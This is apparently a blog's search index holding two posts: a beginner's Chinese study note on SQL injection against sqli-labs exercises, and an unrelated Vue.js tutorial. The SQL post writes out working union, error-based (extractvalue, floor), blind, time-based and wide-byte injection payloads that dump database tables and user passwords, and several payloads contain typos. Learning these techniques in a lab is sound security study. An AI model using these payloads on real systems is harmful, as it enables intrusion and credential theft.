<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入学习笔记</title>
    <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
SQL注入当客户端提交的数据未作处理或转义，直接带入数据库
具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作——-&gt;(通过构造一条精巧的语句来查询想要得到的信息 )

分类
按照查询字段
字符型：当输入的参数为字符串时，称为字符型
数字型：当输入的参数为整形时，可以认为是数字型注入


按照注入方法
Union注入(联合注入)
报错注入
布尔注入
时间注入



注入点是可以实行注入的地方，通常是一个访问数据库的连接 
比如
http://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点

判断字符型注入和数字型注入数字型一般提交内容为数字，但是数字不一定为数字型
1.使用and 1&#x3D;1 和 and 1&#x3D;2来判断

如果提交and 1&#x3D;1 和 and 1&#x3D;2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符’’来提交)
如果提交and 1&#x3D;1能正常显示，提交and 1&#x3D;2不能正常显示，则为数字型

2.可以使用 2-1判断
http://2.0.0.1/sql/Less-1/index.php?id= 2-1//数字型：会查找id=1的值//字符型：不能运算，仍然显示原来的结果

ps：为什么不用+？+有的时候会被理解为空格
闭合方式‘ , “ , ‘) , “)

闭合的作用手动提交闭合符号，结束前一段查询语句
后面即可加入其他语句，查询需要的参数
不需要的语句可以用注释符号’–+’或’#’或’%23’注释掉
Union联合注入注意：联合查询必须要求列数一致，否则报错
查询回显位：查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。
步骤​	0.查找注入点

先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式
 /*1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1&#x27; group by 10 --+2.数字型：直接group by----用order by也可以-----*/


二分法判断列数（group by&#x2F;order by），比如先group by 10 再group by 5这样

根据列数进行union查询
 -- 比如得到列数是3字符型?id=1&#x27; union select 1,2,3 --+-- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）

查询回显位置


拿到表名!!!数据库information_schema

 
-- 比如对于Less-1(字符型)...../index.php?id=0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙

即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()
/index.php?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表

拿到列名与前面类似
/index.php?id=0&#x27; union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = &#x27;users&#x27; --+ 

可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了
字符型：/index.php id=-1&#x27; union select 1,group_concat(username,password),3 from user --+

group_concat()之间可以自己加入分隔符加强可读性
数字型union注入与字符型的区别：不用判断闭合方式
报错注入

报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句
extractvalue注入select extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在

如何让它报错1.如果只是写错路径下的名字，不会报错，只是找不到
2.路径格式错误，报错，会把错的路径报出来
​	构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息
select extractvalue(列名,concat(0x7e,(select database())) from 表名;-- 0x7e是~的ASCII值，使路径错误引起报错                   

index.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字-- 也可以这么写index.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))

如何获得不同的信息在concat的第二个参数动手脚
获取表名
index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))

获取列名
index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))

获取详细信息
index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))

ps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题

index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符

updatexml注入
原理与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样

floor报错




报错原理

分析rand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复

第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错
select count(*),concat_ws(&#x27;-&#x27;,(database()),floor(rand(0)*2)) as a from 表名 group by a;/*这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables*/



盲注
布尔盲注web页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据




但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)&#x2F;substring(str,n,k)来辅助(从第n个字符开始显示k个字符)
index.php?id=1 and substr((&#x27;abcd&#x27;),1,1) //把abcd换成想要的语句


时间盲注


-- 可以根据页面响应时间判断字符型-闭合方式/数字型


-- exampleselect if(acsii(substr((select database()),1,1))&gt;=97,sleep(10),sleep(0))



宽字节注入

局限性：宽字节注入必须使用GBKB编码
意思就是%5c()原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\失去自己的作用

http://192.168.127.186/sql/Less-32/index.php?id=-1%df&#x27; union select 1,group_concat(username,id,password),3 from users --+



注入文件上传mysql文件上传要点show variables like &#x27;%secure%&#x27;; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件into outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径

步骤
还是先判断字符型和数字型
如果是字符型，再判断闭合方式 加上and 1&#x3D;2 和and 1&#x3D;1判断闭合符是否正确
然后判断列数

]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue学习笔记</title>
    <url>/2025/03/05/Vue/</url>
    <content><![CDATA[前期准备下载node.js,安装VueCLI
npm install -g @vue/cli #-g 全局安装vue --version

创建项目
vue create 项目名 #项目名中不能有大写字母，可以有小写字母和-


项目结构
在src下编写代码，其他是配置文件
src&#x2F;assets:存放静态文件（公共CSS文件，图片）
src&#x2F;components：公共组件
App.vue：根组件
main.js:主入口文件
模板语法
&lt;template&gt;  &lt;div class=&quot;hello&quot;&gt;    &lt;h3&gt;学习模板语法&lt;/h3&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;HelloWorld&#x27;,  props: &#123;    msg: String  &#125;&#125;&lt;/script&gt;&lt;!-- &lt;template&gt;中是HTML，&lt;script&gt;中是业务逻辑--&gt;

数据绑定
双大括号搭配js中的data()函数,data()返回一个对象型数据
&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;		&#125;	&#125;&#125;&lt;/script&gt;

结果：

原始HTML
{{}}与v-html区别就好比document.getElementById().innerHTML和document.getElementById().innerText的区别

&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;		&lt;span&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/span&gt;		&lt;p&gt;v&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;,			rawHtml:&#x27;&lt;a href=&quot;https://www.bilibili.com&quot;&gt;bilibili&lt;/a&gt;&#x27;		&#125;	&#125;&#125;&lt;/script&gt;


属性Attribute
&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;		&lt;span&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/span&gt;		&lt;p&gt;v&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;		&lt;span v-bind:id=&quot;Id&quot;&gt;&lt;/span&gt;        &lt;span :id=&quot;Id&quot;&gt;&lt;/span&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;,			rawHtml:&#x27;&lt;a href=&quot;https://www.bilibili.com&quot;&gt;bilibili&lt;/a&gt;&#x27;,			Id:114514		&#125;	&#125;&#125;&lt;/script&gt;

使用JavaScript表达式

&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;		&lt;span&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/span&gt;		&lt;p&gt;v&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;		&lt;span v-bind:id=&quot;Id&quot;&gt;&lt;/span&gt;		&lt;span&gt;&#123;&#123; flag?&quot;123&quot;:&quot;456&quot; &#125;&#125;&lt;/span&gt;		&lt;br&gt;		&lt;span&gt;&#123;&#123; num+10 &#125;&#125;&lt;/span&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;,			rawHtml:&#x27;&lt;a href=&quot;https://www.bilibili.com&quot;&gt;bilibili&lt;/a&gt;&#x27;,			Id:114514,			flag:true,			num:20		&#125;	&#125;&#125;&lt;/script&gt;

不能在双括号里++ – +&#x3D;，会引发无限递归，在 Vue 的模板中，每次渲染时都会执行这个表达式，导致 num 的值不断递增

条件渲染v-if
&lt;template&gt;	&lt;div v-if=&quot;flag&quot;&gt;你好&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	data()&#123;		return&#123;			flag:true		&#125;	&#125;&#125;&lt;/script&gt;

v-else
&lt;template&gt;	&lt;div v-if=&quot;!flag&quot;&gt;你好&lt;/div&gt;	&lt;div v-else&gt;不好&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	data()&#123;		return&#123;			flag:true		&#125;	&#125;&#125;&lt;/script&gt;

v-show
&lt;template&gt;	&lt;div v-if=&quot;!flag&quot;&gt;你好&lt;/div&gt;	&lt;div v-else&gt;不好&lt;/div&gt;	&lt;div v-show=&quot;flag&quot;&gt;芜湖&lt;/div&gt;	&lt;div v-show=&quot;!flag&quot;&gt;不芜湖&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	data()&#123;		return&#123;			flag:true		&#125;	&#125;&#125;&lt;/script&gt;


即使!flag为false，不芜湖这句依然存在，只是css样式被替换
列表渲染
&lt;template&gt;        &lt;li v-for=&quot;item in List&quot;&gt;                &#123;&#123; item.message &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;message:&quot;1&quot;&#125;,                                &#123;message:&quot;2&quot;&#125;,                                &#123;message:&quot;3&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;


维护状态
就地更新指的是
&lt;!--原来--&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;message:&quot;1&quot;&#125;,                                &#123;message:&quot;2&quot;&#125;,                                &#123;message:&quot;3&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;&lt;!--发生更改--&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;message:&quot;1&quot;&#125;,                                &#123;message:&quot;2&quot;&#125;,                                &#123;message:&quot;3&quot;&#125;,                            	&#123;message:&quot;4&quot;&#125;//只会重新渲染这一条新的                        ]                &#125;        &#125;&#125;&lt;/script&gt;

增加v-bind:key属性
&lt;template&gt;        &lt;li v-for=&quot;item in List&quot; :key=&quot;item.id&quot;&gt;                &#123;&#123; item.message &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;id:1,message:&quot;1&quot;&#125;,                                &#123;id:2,message:&quot;2&quot;&#125;,                                &#123;id:3,message:&quot;33&quot;&#125;,                                &#123;id:4,message:&quot;4&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;

如果数组中元素没有id怎么办，v-for遍历时其实有一个索引index，将index作为key
&lt;template&gt;        &lt;li v-for=&quot;(item,index) in List&quot; :key=&quot;index&quot;&gt;                &#123;&#123; item.message &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;id:1,message:&quot;1&quot;&#125;,                                &#123;id:2,message:&quot;2&quot;&#125;,                                &#123;id:3,message:&quot;33&quot;&#125;,                                &#123;id:4,message:&quot;4&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;

事件处理监听事件
v-on缩写为@
&lt;template&gt;        &lt;button @click=&quot;count+=1&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        count:0                &#125;        &#125;&#125;&lt;/script&gt;

事件处理方法
&lt;template&gt;        &lt;button @click=&quot;clickEvent&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        count:0                &#125;        &#125;,        methods:&#123;                clickEvent()&#123;                        this.count+=1;//在事件中读取data的属性需要用this.属性                &#125;        &#125;&#125;&lt;/script&gt;

&lt;template&gt;        &lt;button @click=&quot;clickEvent&quot;&gt;&#123;&#123; message &#125;&#125;&lt;/button&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0,                        message: &quot;通知消息&quot;                &#125;        &#125;,        methods: &#123;                clickEvent(event) &#123;                        event.target.innerHTML = &quot;点击了通知消息&quot;;//对原生dom事件处理                &#125;,                Increment() &#123;                        this.count += 1;                &#125;        &#125;&#125;&lt;/script&gt;

点击前：

点击两个按钮后：

内联处理器中的方法&#x2F;事件传递参数
&lt;!--实现效果：点击列表元素时弹窗内容是列表元素--&gt;&lt;template&gt;        &lt;li @click=&quot;ItemHandle(item)&quot; v-for=&quot;(item,index) in List&quot; :key=&quot;index&quot;&gt;                &#123;&#123; item &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0,                        message: &quot;通知消息&quot;,                        List:[                                &#x27;111&#x27;,&#x27;222&#x27;,&#x27;333&#x27;                        ]                &#125;        &#125;,        methods: &#123;                ItemHandle(item)&#123;                        alert(item);                &#125;        &#125;&#125;&lt;/script&gt;

表单输入绑定
&lt;template&gt;        &lt;input v-model=&quot;username&quot;&gt;        &lt;p&gt;&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        username:&quot;&quot;                &#125;        &#125;&#125;&lt;/script&gt;

实现效果，p标签中的值根据表单输入数据实时更新
修饰符.lazy
&lt;template&gt;        &lt;input v-model.lazy=&quot;username&quot;&gt;        &lt;p&gt;&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        username:&quot;&quot;                &#125;        &#125;&#125;&lt;/script&gt;

回车之后才会同步更新，不会再一边输入一边同步
.trim
组件基础单文件组件
模板：html（必须存在），逻辑：js（看需求存在），样式：css（看需求存在
&lt;template&gt;&lt;/template&gt;&lt;script&gt;&lt;/script&gt;&lt;style&gt;&lt;/style&gt;

加载组件
&lt;!-- 在根组件中App.vue中:    引入组件：import 组件名 from &#x27;组件文件的路径&#x27;    挂在组件:在export default&#123;&#125;块中加入components:&#123;组件名&#125;    显示组件:template块中加上标签&lt;组件名/&gt;--&gt;&lt;!--MyComponent.vue--&gt;&lt;template&gt;        &lt;h3&gt;MyComponent&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;//默认组件                name:&#x27;Mycomponent&#x27;//组件名        &#125;&lt;/script&gt;&lt;!-- scoped:样式只在当前样式中生效 --&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;&lt;/style&gt;&lt;!--App.vue--&gt;&lt;template&gt;  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;  &lt;MyComponent/&gt;  &lt;my-component/&gt;&lt;!--也可以这样写，用-分开单词--&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;  name: &#x27;App&#x27;,  components: &#123;    MyComponent  &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;  font-family: Avenir, Helvetica, Arial, sans-serif;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;  text-align: center;  color: #2c3e50;  margin-top: 60px;&#125;&lt;/style&gt;

效果:

组件的组织
Props组件交互
父组件怎么向子组件中传参？
&lt;!--传参--&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;MyComponent :title=&quot;title&quot;/&gt;&lt;!--:key=&quot;value&quot;的形式--&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                MyComponent        &#125;,        data()&#123;                return &#123;                        title:&quot;props组件交互&quot;                &#125;        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;&lt;!--接收参数--&gt;&lt;template&gt;        &lt;h3&gt;props组件交互&lt;/h3&gt;        &lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                name:&#x27;MyComponent&#x27;,                props:&#123;//固定格式props:&#123;参数名:&#123;type:,default:&#125;&#125;                        title:&#123;                                type:String,                                default:&quot;null&quot;//默认值                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;        p&#123;                color:aquamarine;        &#125;&lt;/style&gt;


&lt;!-- 传递多个参数与数组 --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;MyComponent :title=&quot;name&quot; :age=&quot;age&quot; :List=&quot;List&quot;/&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                MyComponent        &#125;,        data()&#123;                return &#123;                        name:&quot;props&quot;,                        age:20,                        List:[&#x27;amy&#x27;,&#x27;bob&#x27;,&#x27;cindy&#x27;]                &#125;        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;&lt;!-- 接收多个参数与数组 --&gt;&lt;template&gt;        &lt;h3&gt;props组件交互&lt;/h3&gt;        &lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;        &lt;p&gt;age = &#123;&#123; age &#125;&#125;&lt;/p&gt;        &lt;p v-for=&quot;(item,index) in List&quot; :key=&quot;index&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                name:&#x27;MyComponent&#x27;,                props:&#123;                        title:&#123;                                type:String,                                default:&quot;null&quot;                        &#125;,                        age:&#123;                                type:Number,                                default:0                        &#125;,                        List:&#123;                                type:Array,                                //数组和对象必须以函数形式返回(工厂模式)                                default:function()&#123;                                        return [];                                &#125;                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;        p&#123;                color:aquamarine;        &#125;&lt;/style&gt;

自定义事件组件交互用$emit()
&lt;!-- 发送 --&gt;&lt;template&gt;        &lt;h3&gt;自定义事件组件交互&lt;/h3&gt;        &lt;button @click=&quot;SendMessage&quot;&gt;Click~&lt;/button&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                name:&#x27;MyComponent&#x27;,                data()&#123;                        return&#123;                                message:&#x27;这是一个信息&#x27;                        &#125;                &#125;,                methods:&#123;                        SendMessage()&#123;                                /*                                参数一:字符串,是自定义的事件名                                参数二:要传递的内容                                */                                this.$emit(&#x27;OnEvent&#x27;,this.message);                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;        p&#123;                color:aquamarine;        &#125;&lt;/style&gt;&lt;!-- 接收 --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;MyComponent @OnEvent=&quot;GetMessage&quot; /&gt;&lt;!--@自定义事件=&quot;处理的函数&quot;--&gt;        &lt;p&gt;&#123;&#123; Message &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                MyComponent        &#125;,        data()&#123;                return&#123;                        Message:&quot;&quot;                &#125;        &#125;,        methods: &#123;                GetMessage(Message) &#123;//Message就是自定义事件OnEvent传递过来的参数                        this.Message = Message                &#125;        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;

组件生命周期
示意图
#先执行以下命令npm init vue@latest#一路选nnpm install / cnpm inpm run dev

生命周期/*分为：创建期：beforeCreate created挂载期：beforeMount mounted更新期：beforeUpdate updated销毁期：beforeUnmount unmounted*/

钩子函数不能写在methods块中
&lt;template&gt;        &lt;h3&gt;组件生命周期&lt;/h3&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0                &#125;        &#125;,        methods: &#123;                Increment() &#123;                        this.count += 1;                &#125;,        &#125;,        beforeCreate() &#123;                console.log(&#x27;创建前&#x27;);        &#125;,        created() &#123;                console.log(&#x27;已创建&#x27;);        &#125;,        beforeMount() &#123;                console.log(&#x27;挂载前&#x27;);        &#125;,        mounted() &#123;                console.log(&#x27;已挂载&#x27;);        &#125;,        beforeUpdate() &#123;                console.log(&#x27;更新前&#x27;);        &#125;,        updated() &#123;                console.log(&#x27;更新后&#x27;);        &#125;&#125;&lt;/script&gt;&lt;style&gt;h3 &#123;        color: crimson;&#125;&lt;/style&gt;

结果：

Vue引入第三方https://github.com/vuejs/awesome-vue
Swiper官方文档:https://swiperjs.com/vue
必须引入Swiper和SwiperSlide组件和swiper&#x2F;css中的样式
#引入swiper,指定8.1.6版本npm install --save swiper@8.1.6

&lt;template&gt;        &lt;Swiper&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;        &lt;/Swiper&gt;&lt;/template&gt;&lt;script&gt;import &#123; Swiper, SwiperSlide &#125; from &#x27;swiper/vue&#x27;;//引入组件import &#x27;swiper/css&#x27;;//引入样式export default &#123;        name: &#x27;HelloWorld&#x27;,        components: &#123;//注入组件                Swiper,                SwiperSlide        &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;

添加指示器//script标签中加上import &#123; Pagination &#125; from &#x27;swiper&#x27;;import &#x27;swiper/css/pagination&#x27;;//export default块中data()&#123;    return&#123;        modules:[Pagination]    &#125;&#125;//Swiper标签中加上 :modules=&quot;modules&quot; :pagination=&quot;&#123;clickable:true&#125;&quot;

&lt;template&gt;        &lt;Swiper :modules=&quot;modules&quot; :pagination=&quot;&#123;clickable:true&#125;&quot;&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;        &lt;/Swiper&gt;&lt;/template&gt;&lt;script&gt;import &#123; Pagination &#125; from &#x27;swiper&#x27;;import &#123; Swiper, SwiperSlide &#125; from &#x27;swiper/vue&#x27;;import &#x27;swiper/css&#x27;;import &#x27;swiper/css/pagination&#x27;;export default &#123;        name: &#x27;HelloWorld&#x27;,        data()&#123;                return&#123;                        modules:[Pagination]                &#125;        &#125;,        components: &#123;                Swiper,                SwiperSlide        &#125;&#125;&lt;/script&gt;&lt;!-- Add &quot;scoped&quot; attribute to limit CSS to this component only --&gt;&lt;style scoped&gt;&lt;/style&gt;

效果:

生命周期应用通过ref获取元素DOM结构获取DOM的时机：
不能是创建期：UI还未渲染到页面上，无DOM结构
挂载期：挂载前不行，理由同上；挂载后（mounted）可以
更新期与销毁期也可以
&lt;template&gt;        &lt;!-- 要获取的DOM --&gt;        &lt;p ref=&quot;name&quot;&gt;ref~&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                mounted()&#123;                        console.log(this.$refs.name);//this.$refs.name获取                &#125;        &#125;&lt;/script&gt;&lt;!-- 根组件 --&gt;&lt;template&gt;        &lt;User /&gt;&lt;/template&gt;&lt;script&gt;import User from &#x27;./components/User.vue&#x27;export default&#123;        components:&#123;                User        &#125;&#125;&lt;/script&gt;



模拟网络请求渲染数据时机：
created:先获取到数据，但是还没渲染
mounted：先渲染再获取数据
我们选择后者的逻辑
AXios网络请求封装cnpm install --save axioscnpm install --save querystringvue create demonpm run serve

在src下新建一个目录utils，创建文件request.js来封装网络请求
import querystring from &#x27;querystring&#x27;import axios from &#x27;axios&#x27;import &#123; config &#125; from &#x27;process&#x27;;import &#123; log &#125; from &#x27;console&#x27;;const instance = axios.create(&#123;        //网络请求的公共属性        timeout: 10000 //ms&#125;)//处理错误const errorHandle = (status,info) =&gt; &#123;        switch(status)&#123;                default:                        console.log(info);        &#125;&#125;//常用于拦截器//发送数据前requestinstance.interceptors.request.use(        //成功        config =&gt; &#123;//config包含网络请求所有信息                if(config.method === &#x27;post&#x27;)&#123;//对post请求特殊处理,axios中post返回json格式，querystring.stringify转换为url编码                        config.data = querystring.stringify(config.data);                &#125;                return config;        &#125;,        //失败        error =&gt; &#123;                //Promise.reject(error)会将错误抛出，从而可以在调用axios的地方通过 .catch()捕获错误                return Promise.reject(error);        &#125;);//获取数据前responseinstance.interceptors.response.use(        //成功        response =&gt; &#123;                return response.status===200?Promise.resolve(response):Promise.reject(response)        &#125;,        //失败        error =&gt; &#123;                //将error.response赋给response                const &#123;response&#125; = error;                errorHandle(response.status,response.info);        &#125;);export default instance;

将网络请求集中放在src&#x2F;api中

//path.jsconst Base = &#123;        //公共路径        baseURL: &quot;&quot;,        //拼在后面的        extra:&quot;&quot;&#125;export default Base;//index.jsimport axios from &quot;../utils/request&quot;;import path from &quot;./path&quot;;const api = &#123;        get()&#123;                return axios.get(path.baseURL+path.extra);        &#125;&#125;export default api;

